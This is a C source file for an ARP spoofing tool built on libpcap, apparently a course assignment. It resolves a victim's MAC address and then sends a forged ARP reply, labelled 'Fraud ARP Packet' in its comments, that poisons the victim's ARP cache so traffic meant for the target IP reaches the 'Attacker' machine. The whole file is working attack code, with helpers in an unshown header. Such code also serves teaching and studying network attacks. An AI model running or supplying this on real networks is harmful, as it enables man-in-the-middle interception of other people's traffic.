#include <pcap.h>
#include <stdio.h>
#include "arp.h"

void usage(const char *exe) {
    fprintf(stderr, "Usage : %s <Interface> <Sender IP> <Target IP>\n", exe);
}

int main(int argc, char* argv[]) {
    if(argc != 4) {
        usage(argv[0]);
        return -1;
    }
    // 0. Opening Device (interface)

    char errbuf[PCAP_ERRBUF_SIZE];
    char *dev = argv[1];
    bpf_u_int32 net, mask;

    if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "[-] Can't get netmask for device [%s] : %s\n", dev, errbuf);
        return -1;
    }

    pcap_t *handle = pcap_open_live(dev, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf);
    if(handle == NULL) {
        fprintf(stderr, "[-] Can't open device %s : %s\n", dev, errbuf);
        return -1;
    }

    BYTE snd_ip_addr[IP_ADDR_LEN], trg_ip_addr[IP_ADDR_LEN];

    parse_bytes(snd_ip_addr, '.', argv[2], IP_ADDR_LEN, 10);
    parse_bytes(trg_ip_addr, '.', argv[3], IP_ADDR_LEN, 10);

    // 1. Get HW(MAC) Address of Local Machine

    BYTE hw_addr[HW_ADDR_LEN], ip_addr[IP_ADDR_LEN];
    char hw_addr_str[(HW_ADDR_LEN<<1)+1];

    get_hw_ip_addr(hw_addr, ip_addr, dev);
    addr_to_str(hw_addr_str, "Attacker MAC", hw_addr);

    // 2. Get Sender IP Address

    BYTE snd_hw_addr[HW_ADDR_LEN];
    char snd_hw_addr_str[(HW_ADDR_LEN<<1)+1];

    if(set_pcap_filter(handle, hw_addr_str, net) == -1)
        return -1;

    send_arp_packet(handle, REQ, hw_addr, ip_addr, NULL, snd_ip_addr);  // Send ARP Request
    if(get_sender_MAC(snd_hw_addr, handle) == -1) {
        fprintf(stderr, "[-] Error while fetching the target IP\n");
    }
    addr_to_str(snd_hw_addr_str, "SENDER MAC", snd_hw_addr);

    // 3. Send Fraud ARP Packet

    send_arp_packet(handle, REP, hw_addr, trg_ip_addr, snd_hw_addr, snd_ip_addr);

    pcap_close(handle);
    return 0;
}